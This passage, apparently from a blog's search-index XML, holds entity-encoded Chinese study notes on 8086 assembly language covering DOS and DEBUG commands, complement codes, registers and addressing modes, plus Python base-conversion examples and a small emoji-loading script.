FD0;&#x884C;&#x65B9;&#x6CD5;&#x7684;&#x5F62;&#x53C2;&#x3001;&#x5C40;&#x90E8;&#x53D8;&#x91CF;&#x3001;&#x8FD4;&#x56DE;&#x503C;&#x3002;&#x7531;&#x7CFB;&#x7EDF;&#x81EA;&#x52A8;&#x5206;&#x914D;&#x548C;&#x56DE;&#x6536;&#x3002;&#x5806;&#x533A;&#xFF1A;new&#x4E00;&#x4E2A;&#x5BF9;&#x8C61;&#x7684;&#x5F15;&#x7528;&#x6216;&#x5730;&#x5740;&#x5B58;&#x50A8;&#x5728;&#x6808;&#x533A;&#xFF0C;&#x6307;&#x5411;&#x8BE5;&#x5BF9;&#x8C61;&#x5B58;&#x50A8;&#x5728;&#x5806;&#x533A;&#x4E2D;&#x7684;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x3002; document.querySelectorAll('.github-emoji') .forEach(el => { if (!el.dataset.src) { return; } const img = document.createElement('img'); img.style = 'display:none !important;'; img.src = el.dataset.src; img.addEventListener('error', () => { img.remove(); el.style.color = 'inherit'; el.style.backgroundImage = 'none'; el.style.background = 'none'; }); img.addEventListener('load', () => { img.remove(); }); document.body.appendChild(img); });]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Algorithm</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Assembly language]]></title>
    <url>%2F2018%2F10%2F24%2FAssembly-language%2F</url>
    <content type="text"><![CDATA[&#x4E00; DOS&#x53CA;DEBUG&#x4ECB;&#x7ECD;&#xFF1A;DEBUG&#x7684;&#x4E3B;&#x8981;&#x547D;&#x4EE4;DEBUG&#x547D;&#x4EE4;&#x6709;20&#x591A;&#x4E2A;&#xFF0C;&#x6211;&#x4EEC;&#x4E3B;&#x8981;&#x5B66;&#x4E60;&#x6700;&#x5E38;&#x7528;&#x7684;&#x547D;&#x4EE4;&#x3002;R &#x2014;&#x2014;&#x67E5;&#x770B;&#x548C;&#x4FEE;&#x6539;&#x5BC4;&#x5B58;&#x5668;D &#x2014;&#x2014;&#x67E5;&#x770B;&#x5185;&#x5B58;&#x5355;&#x5143;E &#x2014;&#x2014;&#x4FEE;&#x6539;&#x5185;&#x5B58;&#x5355;&#x5143;U &#x2014;&#x2014;&#x53CD;&#x6C47;&#x7F16;&#xFF0C;&#x5C06;&#x673A;&#x5668;&#x6307;&#x4EE4;&#x53D8;&#x4E3A;&#x6C47;&#x7F16;&#x6307;&#x4EE4;T /P&#x2014;&#x2014;&#x5355;&#x6B65;&#x6267;&#x884C;G &#x2014;&#x2014;&#x8FDE;&#x7EED;&#x6267;&#x884C;&#x7A0B;&#x5E8F;A &#x2014;&#x2014;&#x8F93;&#x5165;&#x6C47;&#x7F16;&#x6307;&#x4EE4;Q &#x2014;&#x2014;&#x9000;&#x51FA; &#x672C;&#x4E66;&#x7528;&#x5230;&#x7684;&#x7B80;&#x5355;&#x7684;DOS&#x547D;&#x4EE4;&#xFF1A;cd\ &#x2014;&#x2014;&#x9996;&#x5148;&#x8981;&#x7528;cd\ &#x9000;&#x56DE;&#x5230;&#x6839;&#x76EE;&#x5F55;C&gt;&#x4E0B;dir &#x2014;&#x2014;&#x663E;&#x793A;&#x6587;&#x4EF6;&#x5217;&#x8868;md hb &#x2014;&#x2014;&#x5EFA;&#x7ACB;hb&#x5B50;&#x76EE;&#x5F55;cd hb &#x2014;&#x2014;&#x8FDB;&#x5165;hb&#x5B50;&#x76EE;&#x5F55;copy d:\dos\masm.exe c:\hb &#x2014;&#x2014;&#x5C06;D&#x76D8;dos&#x76EE;&#x5F55;&#x4E0B;&#x7684;masm.exe&#x62F7;&#x8D1D;&#x5230;C&#x76D8;hb&#x76EE;&#x5F55;&#x4E0B;copy d:\dos\link.exe c:\hb &#x2014;&#x2014;&#x5C06;D&#x76D8;dos&#x76EE;&#x5F55;&#x4E0B;&#x7684;link.exe&#x62F7;&#x8D1D;&#x5230;C&#x76D8;hb&#x76EE;&#x5F55;&#x4E0B;cd .. &#x2014;&#x2014;&#x9000;&#x56DE;&#x5230;&#x4E0A;&#x4E00;&#x7EA7;&#x76EE;&#x5F55;del \hb\masm.exe &#x2014;&#x2014;&#x5220;&#x9664;hb&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x67D0;&#x6587;&#x4EF6;rd hb &#x2014;&#x2014;&#x5220;&#x9664;hb&#x5B50;&#x76EE;&#x5F55;&#xFF08;&#x5B50;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6240;&#x6709;&#x6587;&#x4EF6;&#x5FC5;&#x987B;&#x5148;&#x5220;&#x9664;&#xFF09;e&#xFF1A;&#x2014;&#x2014;&#x8FDB;&#x5165;e&#x76D8;cls &#x2014;&#x2014;&#x6E05;&#x5C4F;type&#x2014;&#x2014;&#x663E;&#x793A;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#xFF08;&#x5982;type c:\hb\abc.asm&#xFF09; &#x6570;&#x7684;&#x8865;&#x7801;&#x8868;&#x793A;:&#x5728;&#x8BA1;&#x7B97;&#x673A;&#x4E2D;&#xFF0C;&#x5BF9;&#x5E26;&#x7B26;&#x53F7;&#x6570;&#x53EF;&#x7528;&#x771F;&#x503C;&#x548C;&#x673A;&#x5668;&#x6570;&#x4E24;&#x4E2A;&#x6982;&#x5FF5;&#x8868;&#x793A;&#x3002;&#x771F;&#x503C;&#xFF0C;&#x5C31;&#x662F;&#x5E26;&#x6709;&#x201C;+&#x201D;&#x3001;&#x201C;-&#x201D;&#x53F7;&#x7684;&#x5B9E;&#x9645;&#x6570;&#x503C;&#xFF1B;&#x6240;&#x8C13;&#x673A;&#x5668;&#x6570;&#xFF0C;&#x5219;&#x662F;&#x628A;&#x201C;+&#x201D;&#x3001;&#x201C;-&#x201D;&#x7B26;&#x53F7;&#x6570;&#x503C;&#x5316;&#xFF08;0&#x3001;1&#xFF09;&#x540E;&#x6240;&#x5F97;&#x5230;&#x7684;&#x8BA1;&#x7B97;&#x673A;&#x5B9E;&#x9645;&#x80FD;&#x8868;&#x793A;&#x7684;&#x6570;&#x3002;&#x673A;&#x5668;&#x6570;&#x6709;&#x4E09;&#x79CD;&#x7801;&#x8868;&#x793A;&#xFF0C;&#x5206;&#x522B;&#x662F;&#x539F;&#x7801;&#x3001;&#x53CD;&#x7801;&#x548C;&#x8865;&#x7801;&#x3002;&#x6C47;&#x7F16;&#x8BED;&#x8A00;&#x4E2D;&#xFF0C;&#x6570;&#x90FD;&#x662F;&#x4EE5;&#x8865;&#x7801;&#x7684;&#x5F62;&#x5F0F;&#x8868;&#x793A;&#x7684;&#xFF0C;&#x56E0;&#x6B64;&#x5FC5;&#x987B;&#x638C;&#x63E1;&#x6570;&#x7684;&#x8865;&#x7801;&#x8868;&#x793A;&#x548C;&#x8865;&#x7801;&#x7684;&#x8FD0;&#x7B97;&#x3002;&#x8FD9;&#x4E09;&#x79CD;&#x7801;&#x7684;&#x5B9A;&#x4E49;&#x5982;&#x4E0B;&#xFF1A;&#x539F;&#x7801;&#x3002;&#x539F;&#x7801;&#x5C06;&#x6700;&#x9AD8;&#x4F4D;&#x4F5C;&#x4E3A;&#x7B26;&#x53F7;&#x4F4D;&#xFF0C;&#x6B63;&#x6570;&#x4E3A;0&#xFF0C;&#x8D1F;&#x6570;&#x4E3A;1&#xFF0C;&#x5176;&#x4F59;7&#x4F4D;&#x4F5C;&#x4E3A;&#x6570;&#x503C;&#x4F4D;&#x3002;&#x53CD;&#x7801;&#x3002;&#x6B63;&#x6570;&#x7684;&#x53CD;&#x7801;&#x4E0E;&#x6B63;&#x6570;&#x7684;&#x539F;&#x7801;&#x4E00;&#x6837;&#x3002;&#x800C;&#x6C42;&#x8D1F;&#x6570;&#x7684;&#x53CD;&#x7801;&#x65F6;&#xFF0C;&#x7B26;&#x53F7;&#x4F4D;&#x4E3A;1&#xFF0C;&#x6570;&#x503C;&#x4F4D;&#x5728;&#x539F;&#x7801;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x6C42;&#x53CD;&#x3002;&#x8865;&#x7801;&#x3002;&#x6B63;&#x6570;&#x7684;&#x8865;&#x7801;&#x4E0E;&#x6B63;&#x6570;&#x7684;&#x539F;&#x7801;&#x4E00;&#x6837;&#x3002;&#x6C42;&#x8D1F;&#x6570;&#x7684;&#x8865;&#x7801;&#x65F6;&#xFF0C;&#x7B26;&#x53F7;&#x4F4D;&#x4E3A;1&#xFF0C;&#x6570;&#x503C;&#x4F4D;&#x5728;&#x539F;&#x7801;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#x6C42;&#x53CD;&#x52A0;1&#x3002;&#x4F8B; &#x5341;&#x8FDB;&#x5236;&#x6570;+5&#x548C;-5&#x5206;&#x522B;&#x8868;&#x793A;&#x6210;&#x4E8C;&#x8FDB;&#x5236;&#x6570;&#x539F;&#x7801;&#x3001;&#x53CD;&#x7801;&#x548C;&#x8865;&#x7801;&#x3002;[+5]&#x539F;=[+5]&#x53CD;=[+5]&#x8865;=00000101B[-5]&#x539F;=10000101B[-5]&#x53CD;=11111010B[-5]&#x8865;=11111011B 8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;8086&#x5BC4;&#x5B58;&#x5668;&#x90FD;&#x662F;16&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x9014;&#x53EF;&#x5206;&#x4E3A;4&#x79CD;&#x7C7B;&#x578B;&#x3002;&#x5206;&#x522B;&#x662F;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x63A7;&#x5236;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5982;&#x56FE;&#x6240;&#x793A;&#x3002; img &#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#x6BCF;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;2&#x4E2A;8&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5206;&#x522B;&#x4E3A;AH&#x3001;AL&#xFF0C;BH&#x3001;BL&#xFF0C;CH&#x3001;CL&#xFF0C;DH&#x3001;DL&#x3002;H&#x8868;&#x793A;&#x9AD8;&#x5B57;&#x8282;&#xFF08;&#x9AD8;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3001;L&#x8868;&#x793A;&#x4F4E;&#x5B57;&#x8282;&#xFF08;&#x4F4E;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x4F8B;&#x5982; &#x7528;AX&#x5BC4;&#x5B58;&#x5668;&#x5B58;&#x653E;&#x4E00;&#x4E2A;&#x5B57;1234H&#xFF0C;&#x8868;&#x793A;&#x4E3A;(AX)=1234H&#xFF0C;&#x5373;&#x9AD8;&#x5B57;&#x8282;12&#x653E;&#x5728;AH&#xFF0C;&#x4F4E;&#x5B57;&#x8282;34&#x653E;&#x5728;AL&#x4E2D;&#x3002; &#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x5305;&#x62EC;&#x6307;&#x9488;&#x548C;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;SP&#x3001;BP&#x3001;SI&#x3001;DI&#x56DB;&#x4E2A;16&#x4F4D;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5B83;&#x4EEC;&#x53EF;&#x7528;&#x6765;&#x5B58;&#x653E;&#x5B58;&#x50A8;&#x5668;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x504F;&#x79FB;&#x5730;&#x5740;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5B83;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x901A;&#x7528;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x3002; 8086CPU&#x6709;4&#x4E2A;16&#x4F4D;&#x7684;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x5206;&#x522B;&#x662F;CS&#x4EE3;&#x7801;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;DS&#x6570;&#x636E;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;ES&#x9644;&#x52A0;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;SS&#x5806;&#x6808;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3002; 8086&#x5BC4;&#x5B58;&#x5668;&#x7EC4;8086&#x5BC4;&#x5B58;&#x5668;&#x90FD;&#x662F;16&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x6839;&#x636E;&#x7528;&#x9014;&#x53EF;&#x5206;&#x4E3A;4&#x79CD;&#x7C7B;&#x578B;&#x3002;&#x5206;&#x522B;&#x662F;&#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x3001;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x548C;&#x63A7;&#x5236;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5982;&#x56FE;&#x6240;&#x793A;&#x3002; img &#x6570;&#x636E;&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#x6BCF;&#x4E2A;&#x5BC4;&#x5B58;&#x5668;&#x53C8;&#x53EF;&#x4EE5;&#x5206;&#x4E3A;2&#x4E2A;8&#x4F4D;&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x5206;&#x522B;&#x4E3A;AH&#x3001;AL&#xFF0C;BH&#x3001;BL&#xFF0C;CH&#x3001;CL&#xFF0C;DH&#x3001;DL&#x3002;H&#x8868;&#x793A;&#x9AD8;&#x5B57;&#x8282;&#xFF08;&#x9AD8;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3001;L&#x8868;&#x793A;&#x4F4E;&#x5B57;&#x8282;&#xFF08;&#x4F4E;8&#x4F4D;&#xFF09;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x4F8B;&#x5982; &#x7528;AX&#x5BC4;&#x5B58;&#x5668;&#x5B58;&#x653E;&#x4E00;&#x4E2A;&#x5B57;1234H&#xFF0C;&#x8868;&#x793A;&#x4E3A;(AX)=1234H&#xFF0C;&#x5373;&#x9AD8;&#x5B57;&#x8282;12&#x653E;&#x5728;AH&#xFF0C;&#x4F4E;&#x5B57;&#x8282;34&#x653E;&#x5728;AL&#x4E2D;&#x3002; &#x5730;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x5305;&#x62EC;&#x6307;&#x9488;&#x548C;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;SP&#x3001;BP&#x3001;SI&#x3001;DI&#x56DB;&#x4E2A;16&#x4F4D;&#x5BC4;&#x5B58;&#x5668;&#x3002;&#x987E;&#x540D;&#x601D;&#x4E49;&#xFF0C;&#x5B83;&#x4EEC;&#x53EF;&#x7528;&#x6765;&#x5B58;&#x653E;&#x5B58;&#x50A8;&#x5668;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x504F;&#x79FB;&#x5730;&#x5740;&#x3002;&#x53E6;&#x5916;&#xFF0C;&#x5B83;&#x4EEC;&#x4E5F;&#x53EF;&#x4EE5;&#x4F5C;&#x4E3A;&#x901A;&#x7528;&#x5BC4;&#x5B58;&#x5668;&#x7528;&#x3002; 8086CPU&#x6709;4&#x4E2A;16&#x4F4D;&#x7684;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x5206;&#x522B;&#x662F;CS&#x4EE3;&#x7801;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;DS&#x6570;&#x636E;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;ES&#x9644;&#x52A0;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3001;SS&#x5806;&#x6808;&#x6BB5;&#x5BC4;&#x5B58;&#x5668;&#x3002; DOS&#x547D;&#x4EE4;&#x7528;&#x6CD5; &#x5217;&#x8868;&#x9879;&#x76EE;DIR == &#x8FDB;&#x5165;&#x6839;&#x76EE;&#x5F55;CD [filename] == &#x8FDB;&#x5165;&#x5B50;&#x76EE;&#x5F55; DEBUG&#x547D;&#x4EE4;&#x7528;&#x6CD5;&#x901A;&#x8FC7;&#x6539;&#x53D8;IP&#x7684;&#x503C;&#x53EF;&#x4EE5;&#x5728;&#x4E0D;&#x540C;&#x7684;&#x4F4D;&#x7F6E;&#x8FDB;&#x884C;&#x2013;&#x8F93;&#x5165;&#x6C47;&#x7F16;&#x6307;&#x4EE4;&#x548C;&#x53CD;&#x6C47;&#x7F16;&#x3002; tips: &#x5728;&#x505A;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#x9047;&#x5230;&#x5341;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x516D;&#x8FDB;&#x5236;&#x8FD9;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF0C;&#x81EA;&#x5DF1;&#x7B97;&#xFF01;&#xFF08;&#x600E;&#x4E48;&#x53EF;&#x80FD;&#x2026;&#xFF09;&#x60F3;&#x5230;&#x4E86;&#x4EE5;&#x524D;&#x7528;Python&#x65F6;&#x8FDB;&#x884C;&#x7684;&#x8FDB;&#x5236;&#x8F6C;&#x6362;&#x7528;&#x7740;&#x8FD8;&#x662F;&#x6BD4;&#x8F83;&#x65B9;&#x4FBF;&#x7684;&#x3002;123456789101112131415# &#x5341;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x516D;&#x8FDB;&#x5236;&gt;&gt;&gt; hex(56)&apos;0x38&apos;# &#x5341;&#x516D;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x8FDB;&#x5236;&gt;&gt;&gt; int(&apos;0xFFF&apos;, 16)4095# &#x4E8C;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x8FDB;&#x5236;&gt;&gt;&gt; int(&apos;11101&apos;, 2)29# &#x516B;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x8FDB;&#x5236;&gt;&gt;&gt; int(&apos;764&apos;, 8)500# &#x4E8C;&#x8FDB;&#x5236;&#x8F6C;&#x5341;&#x516D;&#x8FDB;&#x5236;&gt;&gt;&gt; hex(int(&apos;11101&apos;, 2))&apos;0x1d&apos; &#x662F;&#x4E0D;&#x662F;&#x7279;&#x522B;&#x65B9;&#x4FBF;^_^more &#x4E8C; &#x5BFB;&#x5740;&#x65B9;&#x5F0F;:&#x6C47;&#x7F16;&#x6307;&#x4EE4;&#x7531;&#x64CD;&#x4F5C;&#x7801;&#x5B57;&#x6BB5;&#x548C;&#x64CD;&#x4F5C;&#x6570;&#x5B57;&#x6BB5;&#x6784;&#x6210;&#x3002;&#x5BF9;&#x4E8E;&#x53CC;&#x64CD;&#x4F5C;&#x6307;&#x4EE4;&#xFF0C;&#x7B2C;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x79F0;&#x4E3A;&#x76EE;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#xFF0C;&#x8868;&#x793A;&#x64CD;&#x4F5C;&#x540E;&#x7684;&#x7ED3;&#x679C;&#xFF1B;&#x7B2C;&#x4E8C;&#x4E2A;&#x64CD;&#x4F5C;&#x6570;&#x79F0;&#x4E3A;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#xFF0C;&#x8868;&#x793A;&#x6765;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#x3002;&#x4E24;&#x8005;&#x4EE5;&#x9017;&#x53F7;&#x5206;&#x9694;&#x3002;&#x5982;&#xFF1A; img &#x6240;&#x8C13;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF0C;&#x5373;&#x6307;&#x4EE4;&#x4E2D;&#x63D0;&#x4F9B;&#x64CD;&#x4F5C;&#x6570;&#x6216;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x65B9;&#x5F0F;&#x3002;&#x901A;&#x4FD7;&#x5730;&#x8BF4;&#x5C31;&#x662F;&#x5BFB;&#x627E;&#x64CD;&#x4F5C;&#x6570;&#x5730;&#x5740;&#x7684;&#x65B9;&#x6CD5;&#x3002;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x7684;&#x6570;&#x91CF;&#x4EE3;&#x8868;&#x4E86;&#x5FAE;&#x673A;&#x7CFB;&#x7EDF;&#x5BF9;&#x5B58;&#x50A8;&#x5668;&#x7BA1;&#x7406;&#x80FD;&#x529B;&#x7684;&#x5F3A;&#x5F31;&#xFF0C;&#x5408;&#x7406;&#x5730;&#x4F7F;&#x7528;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x53EF;&#x4EE5;&#x6269;&#x5927;&#x8BBF;&#x5B58;&#x7A7A;&#x95F4;&#xFF0C;&#x7F29;&#x77ED;&#x6307;&#x4EE4;&#x957F;&#x5EA6;&#xFF0C;&#x6EE1;&#x8DB3;&#x5404;&#x79CD;&#x7A0B;&#x5E8F;&#x8BBE;&#x8BA1;&#x9700;&#x8981;&#x3002;&#x4E0E;&#x6570;&#x636E;&#x6709;&#x5173;&#x7684;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5212;&#x5206;&#x4E3A;&#x4E09;&#x7C7B;&#xFF1A;&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF0C;&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#xFF0C;&#x5B58;&#x50A8;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x3002; &#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x6240;&#x8981;&#x627E;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x76F4;&#x63A5;&#x5199;&#x5728;&#x6307;&#x4EE4;&#x4E2D;&#xFF0C;&#x8FD9;&#x79CD;&#x64CD;&#x4F5C;&#x6570;&#x53EB;&#x7ACB;&#x5373;&#x6570;&#x3002;&#x5728;8086&#x3001;80286&#x4E2D;&#x7ACB;&#x5373;&#x6570;&#x662F;8&#x4F4D;&#x6216;16&#x4F4D;&#x7684;&#xFF0C;&#x5728;80386&#x4EE5;&#x4E0A;&#x53EF;&#x4EE5;&#x662F;32&#x4F4D;&#x7684;&#x7ACB;&#x5373;&#x6570;&#x3002;&#x7ACB;&#x5373;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x7528;&#x6765;&#x8868;&#x793A;&#x5E38;&#x6570;&#x3002;123456-AMOV AX&#xFF0C;3060MOV AL&#xFF0C;5MOV BL&#xFF0C;FFMOV BX&#xFF0C;A46D MOV CX&#xFF0C;17 &#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x5728;&#x5BC4;&#x5B58;&#x5668;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x4E2D;&#xFF0C;&#x64CD;&#x4F5C;&#x6570;&#x5728;&#x5BC4;&#x5B58;&#x5668;&#x4E2D;&#xFF0C;&#x5728;&#x6307;&#x4EE4;&#x4E2D;&#x6307;&#x5B9A;&#x5BC4;&#x5B58;&#x5668;&#x540D;&#x5373;&#x53EF;&#x3002; 123456-AMOV AX&#xFF0C;0MOV BX&#xFF0C;1234MOV AX&#xFF0C;BXMOV CL&#xFF0C;AHMOV AX&#xFF0C;4650 &#x76F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x504F;&#x79FB;&#x5730;&#x5740;&#xFF08;&#x4E5F;&#x79F0;&#x4E3A;&#x6709;&#x6548;&#x5730;&#x5740;EA&#xFF09;&#x76F4;&#x63A5;&#x5199;&#x5728;&#x6307;&#x4EE4;&#x4E2D;&#x3002; &#xFF08;1&#xFF09;&#x5B58;&#x50A8;&#x5668;&#x8BFB;&#x64CD;&#x4F5C; MOV&#x6307;&#x4EE4;&#x53EF;&#x4EE5;&#x5B9E;&#x73B0;CPU&#x5BF9;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x8BFB;&#x5199;&#x3002;&#x82E5;&#x4F20;&#x9001;&#x6307;&#x4EE4;&#x7684;&#x76EE;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x662F;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;&#xFF0C;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#x662F;&#x5B58;&#x50A8;&#x5355;&#x5143;&#xFF0C;&#x5C31;&#x5B8C;&#x6210;&#x4E86;&#x5BF9;&#x5B58;&#x50A8;&#x5668;&#x7684;&#x8BFB;&#x64CD;&#x4F5C;&#x3002; &#x4F8B;1 MOV AX&#xFF0C;DS:[2000H]&#x8BE5;&#x6307;&#x4EE4;&#x8868;&#x793A;&#x4ECE;&#x6570;&#x636E;&#x6BB5;&#x7684;2000H&#x5355;&#x5143;&#x8BFB;&#x51FA;&#x4E00;&#x4E2A;&#x5B57;&#x9001;&#x5165;AX&#x3002; &#xFF08;2&#xFF09;&#x5B58;&#x50A8;&#x5668;&#x5199;&#x64CD;&#x4F5C; &#x5982;&#x679C;&#x8981;&#x5B9E;&#x73B0;CPU&#x5199;&#x5185;&#x5B58;&#x64CD;&#x4F5C;&#xFF0C;&#x53EA;&#x8981;&#x628A;MOV&#x6307;&#x4EE4;&#x7684;&#x76EE;&#x7684;&#x64CD;&#x4F5C;&#x6570;&#x53D8;&#x4E3A;&#x5B58;&#x50A8;&#x5355;&#x5143;&#xFF0C;&#x6E90;&#x64CD;&#x4F5C;&#x6570;&#x4E3A;CPU&#x7684;&#x5BC4;&#x5B58;&#x5668;&#x5373;&#x53EF;&#x3002; &#x4F8B;2 MOV DS:[4000H]&#xFF0C;AX&#x5C06;AX&#x7684;&#x503C;&#x5199;&#x5165;&#x6570;&#x636E;&#x6BB5;&#x7684;4000H&#x5355;&#x5143;&#x3002;123-AMOV AX&#xFF0C;DS:[2000]MOV DS:[4000]&#xFF0C;AX &#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV AX&#xFF0C;[BX]&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x5728;&#x57FA;&#x5740;&#x5BC4;&#x5B58;&#x5668;BX&#x3001;BP&#x6216;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;SI&#x3001;DI&#x4E2D;&#xFF0C;&#x800C;&#x64CD;&#x4F5C;&#x6570;&#x7684;&#x6BB5;&#x5730;&#x5740;&#x5728;&#x6570;&#x636E;&#x6BB5;DS&#x6216;&#x5806;&#x6808;&#x6BB5;SS&#x4E2D;&#x3002;&#x5982;&#x679C;&#x6709;&#x6548;&#x5730;&#x5740;&#x7531;BX&#x3001;SI&#x3001;DI&#x6307;&#x51FA;&#xFF0C;&#x5219;&#x9ED8;&#x8BA4;&#x4E3A;&#x5BF9;&#x5E94;&#x4E8E;&#x6570;&#x636E;&#x6BB5;&#xFF0C;&#x800C;&#x7528;BP&#x6307;&#x51FA;&#x5219;&#x5BF9;&#x5E94;&#x4E8E;&#x5806;&#x6808;&#x6BB5;&#x3002;123456-R DS 1500-E DS:4580 64 23-D DS:4580-AMOV BX&#xFF0C;4580MOV AX&#xFF0C;[BX] &#x5BC4;&#x5B58;&#x5668;&#x76F8;&#x5BF9;&#x5BFB;&#x5740;&#x65B9;&#x5F0F;&#x64CD;&#x4F5C;&#x6570;&#x5B58;&#x653E;&#x5728;&#x5185;&#x5B58;&#x4E2D;&#x3002;&#x6307;&#x4EE4;&#x5F62;&#x5F0F;&#x5982;&#xFF1A; MOV AX&#xFF0C;[BX+1200H]&#x64CD;&#x4F5C;&#x6570;&#x7684;EA&#x662F;&#x4E00;&#x4E2A;&#x57FA;&#x5740;&#x6216;&#x53D8;&#x5740;&#x5BC4;&#x5B58;&#x5668;&#x7684;&#x5185;&#x5BB9;&#x518D;&#x52A0;&#x4E0A;8&#x4F4D;&#x6216;16&#x4F4D;&#x4F4D;&#x79FB;&#x91CF;&#x4E4B;&#x548C;&#x3002;&#x4E5F;&#x5C31;&#x662F;&#x8BF4;&#x5728;&#x5BC4;&#x5B58;&#x5668;&#x95F4;&#x63A5;&#x5BFB;&#x5740;&#x7684;&#x57FA;&#x7840;&#x4E0A;&#xFF0C;&#x589E;&#x52A0;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x91CF;&#xFF08;&#x4F4D;&#x79FB;&#x91CF;&#xFF09;&#x3002;&#x8FD9;&#x4E2A;&#x4F4D;&#x79FB;&#x91CF;&#x53EF;&#x4EE5;&#x662F;&#x7ACB;&#x5373;&#x6570;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x662F;&#x7B26;&#x53F7;&#x5730;&#x5740;&#x3002; 123456-R DS 1500-E DS:7335 28 24-D DS:7335-AMOV SI&#xFF0C;7310MOV AX&#xFF0C;25[SI] 